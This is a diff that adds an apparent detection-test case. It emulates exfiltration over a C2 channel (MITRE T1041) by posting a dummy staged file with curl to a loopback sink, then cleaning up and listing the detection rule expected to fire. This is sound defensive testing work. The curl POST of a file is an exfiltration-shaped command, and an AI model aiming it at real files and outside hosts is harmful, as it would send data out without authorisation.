@@ -1,0 +1,40 @@
+id: eye-704-curl-post-staged
+name: curl POST staged file to loopback sink
+description: |
+  Mimics T1041 (Exfiltration Over C2 Channel): curl -X POST
+  --data-binary @<file> to a loopback sink. No external traffic — the
+  POST connect-refused (or 404) is the network outcome; the slither
+  signal is the curl invocation shape.
+
+attack:
+  technique: T1041
+  tactic: TA0010
+
+destructiveness: low
+platforms: [linux]
+
+execute:
+  - shell: bash
+    command: |
+      mkdir -p /tmp/eyeexam-704
+      printf 'eye-704 staged exfil payload\n' > /tmp/eyeexam-704/payload.bin
+      curl -sS -m 2 -X POST \
+        --data-binary @/tmp/eyeexam-704/payload.bin \
+        http://127.0.0.1:1/eyeexam-exfil-sink \
+        > /tmp/eyeexam-704/curl.out 2>&1 || true
+      echo "eye-704 curl POST attempt complete"
+
+cleanup:
+  - shell: bash
+    command: |
+      rm -rf /tmp/eyeexam-704
+
+verify_cleanup:
+  - shell: bash
+    command: |
+      test ! -e /tmp/eyeexam-704
+
+expected_detections:
+  - sigma_id: 8b7c4d00-0001-4000-8000-00000000002f
+    backend: slither
+    description: proc-curl-post-data-binary — curl POST with --data-binary @file
